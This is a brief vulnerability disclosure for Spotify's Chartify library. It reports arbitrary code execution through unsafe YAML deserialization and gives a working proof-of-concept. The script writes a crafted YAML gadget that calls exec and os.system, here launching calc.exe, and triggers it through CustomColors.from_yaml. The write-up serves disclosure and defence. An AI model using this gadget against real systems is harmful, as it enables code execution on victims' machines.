# Description

**Chartify** is a Python library that makes it easy for data scientists to create charts.
This package was vulnerable to Arbitrary code execution via Insecure YAML deserialization due to the use of a known vulnerable function **load()** in **yaml**. <br>

repo: https://github.com/spotify/chartify

# Proof of Concept

```python
#!/usr/bin/env python3
from chartify._core.colors import *

payload = '''
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
'''
open('pwn.yml', 'w+').write(payload)

CustomColors.from_yaml('hek', 'pwn.yml')
print("pwned 🏴")
```

* `pip3 install chartify`
* `python3 exploit.py`
